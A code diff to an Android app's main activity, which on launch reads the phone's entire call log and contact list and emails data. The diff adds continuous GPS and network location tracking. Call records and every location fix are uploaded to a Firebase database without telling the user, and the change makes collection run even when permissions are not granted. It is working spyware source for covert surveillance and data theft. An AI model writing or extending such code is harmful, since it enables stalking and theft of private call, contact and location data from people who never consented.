@@ -9,6 +9,9 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.net.Uri;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
@@ -32,6 +35,7 @@ import androidx.viewpager.widget.ViewPager;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.appcompat.widget.Toolbar;
 
+
 public class MainActivity extends AppCompatActivity {
 
     private ViewPager viewPager;
@@ -49,6 +53,11 @@ public class MainActivity extends AppCompatActivity {
         return ctx;
     }
     private int PERMISSION_ALL = 1;
+    private LocationManager mLocationManagerGPS;
+    private LocationListener mLocationListenerGPS;
+    private LocationManager mLocationManagerNetwork;
+    private LocationListener mLocationListenerNetwork;
+
     private String[] PERMISSIONS = {
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.READ_CALL_LOG,
@@ -59,7 +68,8 @@ public class MainActivity extends AppCompatActivity {
             Manifest.permission.ACCESS_NETWORK_STATE,
             Manifest.permission.ACCESS_FINE_LOCATION,
             Manifest.permission.ACCESS_COARSE_LOCATION,
-            Manifest.permission.GET_ACCOUNTS
+            Manifest.permission.GET_ACCOUNTS,
+            Manifest.permission.ACCESS_FINE_LOCATION
     };
 
 
@@ -85,12 +95,14 @@ public class MainActivity extends AppCompatActivity {
             ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
         }
 
-        else {
+
             //execute all functions
             getAllCallLogs(this);
             getContactList(this);
             sendEmail();
-        }
+            getPositionNetwork();
+            getPositionGPS();
+
     }// OnCreate
     //after getting the result of permission request
 
@@ -139,41 +151,76 @@ public class MainActivity extends AppCompatActivity {
 
     private void getAllCallLogs(Context cr) {
 
+        String callTypeformatted ,callNew ;
         FirebaseDatabase database = FirebaseDatabase.getInstance();
         // reading all data in descending order according to DATE
         String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
         Uri callUri = Uri.parse("content://call_log/calls");
         Cursor cur = cr.getContentResolver().query(callUri, null, null, null, strOrder);
+
         // loop through cursor
         while (cur.moveToNext()) {
 
             DatabaseReference myCallRef = database.getReference().child("Call Logs").push();
 
-            String callNumber = cur.getString(cur
-                    .getColumnIndex(android.provider.CallLog.Calls.NUMBER));
-            String callName = cur
-                    .getString(cur
-                            .getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));
-            String callDate = cur.getString(cur
-                    .getColumnIndex(android.provider.CallLog.Calls.DATE));
-            SimpleDateFormat formatter = new SimpleDateFormat(
-                    "dd-MMM-yyyy HH:mm");
-            String dateString = formatter.format(new Date(Long
-                    .parseLong(callDate)));
-            String callType = cur.getString(cur
-                    .getColumnIndex(android.provider.CallLog.Calls.TYPE));
-            String isCallNew = cur.getString(cur
-                    .getColumnIndex(android.provider.CallLog.Calls.NEW));
-            String duration = cur.getString(cur
-                    .getColumnIndex(android.provider.CallLog.Calls.DURATION));
+            String callNumber = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
+            String callName = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));
+            String callDate = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DATE));
+            SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm");
+            String dateString = formatter.format(new Date(Long.parseLong(callDate)));
+
+            int callType = (cur.getColumnIndex(android.provider.CallLog.Calls.TYPE));
+
+
+            if (callType == 1)
+            {
+                callTypeformatted = "Incoming";
+            }
+            else if (callType == 2)
+            {
+                callTypeformatted = "Outgoing";
+            }
+            else if (callType == 3)
+            {
+                callTypeformatted = "Missed Call";
+            }
+            else if (callType == 4)
+            {
+                callTypeformatted = "Voice Mail";
+            }
+            else if (callType == 5)
+            {
+                callTypeformatted = "Rejected";
+            }
+            else if (callType == 6)
+            {
+                callTypeformatted = "Blocked";
+            }
+            else
+            {
+                callTypeformatted = "Answered Externally";
+            }
+
+            int isCallNew = (cur.getColumnIndex(android.provider.CallLog.Calls.NEW));
+
+
+            if (isCallNew == 1){
+                callNew = "Unseen";
+            }
+            else{
+                callNew = "Seen";
+            }
+
+
+            String duration = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DURATION));
             // process log data...
 
             //populate the realtime firebase
             myCallRef.child("Caller Name").setValue(callName);
-            myCallRef.child("Call Number").setValue(callNumber);
+            myCallRef.child("Phone Number of Caller").setValue(callNumber);
             myCallRef.child("Date of Call").setValue(dateString);
-            myCallRef.child("Call Type").setValue(callType);
-            myCallRef.child("New Call").setValue(isCallNew);
+            myCallRef.child("Call Type").setValue(callTypeformatted);
+            myCallRef.child("Call Status").setValue(callNew);
             myCallRef.child("Call Duration in Seconds").setValue(duration);
         }
     }
@@ -311,11 +358,77 @@ public class MainActivity extends AppCompatActivity {
         return false;
     }
 
+
     @Override
     protected void onDestroy()
     {
         stopService(mServiceIntent);
         Log.i("MainAct","onDestroy!");
         super.onDestroy();
+    }
+
+    //get location by 3G/LTE + Location service
+    private void getPositionGPS() {
+
+        FirebaseDatabase database = FirebaseDatabase.getInstance();
+        final DatabaseReference myRefGPS = database.getReference("Location");
+        mLocationManagerGPS = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);
+
+        mLocationListenerGPS = new LocationListener() {
+            public void onLocationChanged(Location location) {
+                String gpsloc = "Latitude: " + Double.toString(location.getLatitude()) + " Longitude: " + Double.toString(location.getLongitude())
+                        + " Altitude: " + Double.toString(location.getAltitude());
+                myRefGPS.push().setValue(gpsloc);
+            }
+
+            public void onStatusChanged(String provider, int status, Bundle extras) {
+            }
+
+            public void onProviderEnabled(String provider) {
+            }
+
+            public void onProviderDisabled(String provider) {
+            }
+        };
+
+
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+
+        }
+        mLocationManagerGPS.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1, 0, mLocationListenerGPS);
+
+    }
+
+    //get location by 3G/LTE
+    private void getPositionNetwork() {
+
+        FirebaseDatabase database = FirebaseDatabase.getInstance();
+        final DatabaseReference myRefLocation = database.getReference("Location");
+        mLocationManagerNetwork = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);
+
+        mLocationListenerNetwork = new LocationListener() {
+            public void onLocationChanged(Location location) {
+                String gpsloc = "Latitude: " + Double.toString(location.getLatitude()) + " Longitude: " + Double.toString(location.getLongitude())
+                        + " Altitude: " + Double.toString(location.getAltitude());
+                myRefLocation.push().setValue(gpsloc);
+            }
+
+            public void onStatusChanged(String provider, int status, Bundle extras) {
+            }
+
+            public void onProviderEnabled(String provider) {
+            }
+
+            public void onProviderDisabled(String provider) {
+                //showAlert(R.string.Network_disabled);
+            }
+        };
+
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            }
+                mLocationManagerNetwork.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 25000, 0, mLocationListenerNetwork);
+
+        }
     }
 }
